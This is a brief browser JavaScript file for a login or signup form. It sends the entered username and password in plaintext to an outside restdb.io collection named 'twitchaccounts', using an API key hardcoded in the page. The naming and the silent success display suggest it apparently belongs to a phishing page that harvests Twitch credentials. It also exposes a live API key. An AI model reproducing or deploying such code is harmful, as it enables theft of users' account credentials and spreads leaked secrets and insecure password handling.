let el = document.getElementById("signup");

let wrong = document.getElementById("wrong");

localStorage.clear();

function FinishLoading() {
    setTimeout(function(){
        const loader = document.querySelector(".loading");
        loader.remove();
        
       }, 500)
}
  
FinishLoading();
function submit() {
    let username = document.getElementById("username");

    let password = document.getElementById("password");

    let jsondata = {
        "username": username.value,
        "password": password.value
    }

    fetch("https://twitchaccounts-179c.restdb.io/rest/accounts", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "x-apikey": "65b735c95a960f4dd87795a3",
        "Cache-Control": "no-cache"
    },
    body: JSON.stringify(jsondata)
    })
    .then(response => {
        return response.json();
    })
    wrong.classList.remove("text-white");
    wrong.classList.add("text-success");
}


el.addEventListener("click", submit);